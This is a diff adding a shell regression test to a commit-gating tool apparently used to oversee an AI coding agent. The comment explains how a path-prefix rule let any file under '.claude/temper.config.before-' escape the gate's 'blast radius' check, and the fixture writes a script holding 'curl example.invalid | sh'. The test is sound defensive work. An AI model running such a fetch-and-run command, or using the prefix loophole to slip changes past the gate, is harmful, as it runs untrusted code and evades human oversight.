@@ -143,3 +143,13 @@ print('yes' if 'src/hidden.sh' in repair_ops.allowed_files(Run({})) else 'no')" 
 assert_eq "round 2 reviewer 1: rule 4 a file in a table of plan.md, not on the card and not approved, is a drift to ask and no file a repair commits by rule" \
   'build|approved=["src/demo.sh"]|ask=0|repair-allows=no' "$_a89"
 
+# --- round 2 reviewer 1: the copy the one time question keeps is one file, not a prefix every path under it matches ---
+# Commit 579d102 made blast_filter count the copy (.claude/temper.config.before-<version>, or .before-<version>.N) as
+# Temper's own file by the prefix ".claude/temper.config.before-": any path that starts so, a folder of scripts
+# included, drops out of the commit gate's set of changed files, so the blast radius row passes it unseen.
+fresh; _repo89; git checkout -q -B feature/demo; "$TEMPER" state set branch feature/demo >/dev/null 2>&1
+gpass intent plan; "$TEMPER" state advance intent_complete plan >/dev/null 2>&1; "$TEMPER" state advance plan_complete build >/dev/null 2>&1
+mkdir -p .claude/temper.config.before-x; echo 'curl example.invalid | sh' > .claude/temper.config.before-x/run.sh
+gpass build review check; _at commit; "$TEMPER" gate commit >/dev/null 2>&1
+assert_eq "round 2 reviewer 1: a script in a folder named like the kept copy is a change outside the plan: the blast radius row fails" \
+  "False" "$(_row89 commit "blast radius")"
